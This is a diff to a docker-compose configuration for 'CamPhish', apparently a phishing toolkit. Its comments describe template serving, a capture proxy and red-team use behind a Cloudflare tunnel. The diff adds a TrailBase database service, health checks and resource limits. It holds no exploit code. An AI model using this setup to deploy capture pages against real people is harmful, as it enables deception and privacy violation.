@@ -1,6 +1,35 @@
 services:
+  # =========================================================================
+  # TrailBase — Data layer (SQLite/Postgres, REST CRUD, Realtime, Auth, Admin UI)
+  # =========================================================================
+  trailbase:
+    image: trailbase/trailbase:latest
+    container_name: camphish-trailbase
+    restart: unless-stopped
+    ports:
+      - "127.0.0.1:4000:4000"
+    environment:
+      - ADDRESS=0.0.0.0:4000
+      - ADMIN_EMAIL=${TRAILBASE_ADMIN_EMAIL:-admin@camphish.local}
+      - ADMIN_PASSWORD=${TRAILBASE_ADMIN_PASSWORD:-changeme}
+    volumes:
+      - trailbase_data:/app/traildepot
+      - ./trailbase/schema:/app/traildepot/migrations:ro
+    healthcheck:
+      test: ["CMD", "curl", "-f", "http://localhost:4000/api/health"]
+      interval: 10s
+      timeout: 5s
+      retries: 5
+      start_period: 15s
+    networks:
+      - camphish-net
+
+  # =========================================================================
+  # CamPhish — Application server (template serving + capture proxy + red team)
+  # =========================================================================
   app:
     build: .
+    image: camphish:${VERSION:-2.1.0}
     container_name: camphish-app
     restart: unless-stopped
     ports:
@@ -13,17 +42,37 @@ services:
       - TEMPLATES_DIR=/app/templates
       - FRONTEND_DIR=/app/frontend/dist
       - LISTEN_ADDR=0.0.0.0:8080
-      - DATABASE_URL=sqlite:///app/data/camphish.db?mode=rwc
       - TUNNEL_LINK=
+      - RUST_LOG=${LOG_LEVEL:-info}
+      - GRACEFUL_SHUTDOWN=true
+      - ENABLE_COMPRESSION=true
+      - ENABLE_TEMPLATE_CACHE=true
+      # TrailBase connection
+      - TRAILBASE_URL=http://trailbase:4000
+      - TRAILBASE_API_KEY=${TRAILBASE_API_KEY:-}
+      - TRAILBASE_ADMIN_EMAIL=${TRAILBASE_ADMIN_EMAIL:-admin@camphish.local}
+      - TRAILBASE_ADMIN_PASSWORD=${TRAILBASE_ADMIN_PASSWORD:-changeme}
+    depends_on:
+      trailbase:
+        condition: service_healthy
     healthcheck:
       test: ["CMD", "curl", "-f", "http://localhost:8080/api/health"]
-      interval: 30s
+      interval: ${HEALTH_CHECK_INTERVAL:-30}s
       timeout: 5s
-      retries: 3
-      start_period: 10s
+      retries: ${HEALTH_CHECK_RETRIES:-3}
+      start_period: ${HEALTH_CHECK_START_PERIOD:-10}s
+    deploy:
+      resources:
+        limits:
+          memory: 512M
+        reservations:
+          memory: 64M
     networks:
       - camphish-net
 
+  # =========================================================================
+  # Tunnels
+  # =========================================================================
   cloudflared:
     image: cloudflare/cloudflared:latest
     container_name: camphish-cloudflared
@@ -52,6 +101,7 @@ services:
 
 volumes:
   camphish_data:
+  trailbase_data:
 
 networks:
   camphish-net:
